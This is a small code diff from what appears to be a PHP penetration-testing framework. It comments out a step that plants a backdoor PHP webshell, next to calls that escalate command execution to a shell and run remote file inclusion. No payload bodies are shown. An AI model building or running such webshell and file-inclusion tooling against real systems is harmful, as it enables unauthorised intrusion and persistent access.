@@ -31,8 +31,8 @@ class poc4web extends poc4service{
         $url_fi->poc($this->flag_poc);
         $url_fi->ce2shell8param($OS);
         exit();
-        $webshell = new malware4linux($owasp, $url_fi->ip, $url_fi->port_rfi, "$url_fi->dir_tmp/backdoor_php_webshell.php", "");
-        $webshell->backdoor_com_webshell_php();
+        //$webshell = new malware4linux($owasp, $url_fi->ip, $url_fi->port_rfi, "$url_fi->dir_tmp/backdoor_php_webshell.php", "");
+        //$webshell->backdoor_com_webshell_php();
         
         $this->gtitre("Remote File Inclusion");
         $url_fi->fi_rfi();
